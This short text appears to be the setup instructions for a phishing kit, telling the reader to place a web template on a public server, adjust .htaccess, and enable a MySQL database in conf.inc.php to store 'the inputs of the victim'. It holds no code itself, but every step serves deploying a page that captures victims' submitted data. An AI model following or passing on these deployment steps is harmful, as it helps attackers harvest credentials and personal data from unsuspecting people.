1: place the template into your public webserver folder
2: Edit the .htaccess file if the links on YOUR webserver are not correctly set,
it can cause errors but if it works, leave it :)

# CONFIGURATION #

if you want to use a database to store the inputs of the victim you have to go to
the folder /includes/ and edit conf.inc.php. Then set $use_db to true (standard: false).
fill in your own credentials in database properties. Then just setup a database, for linux
users on terminal, or PHPMYADMIN, whatever for MYSQLserver software you use. And create
the database. (make sure it is correctly set in the conf.inc.php).

Then it works. (hopefully).
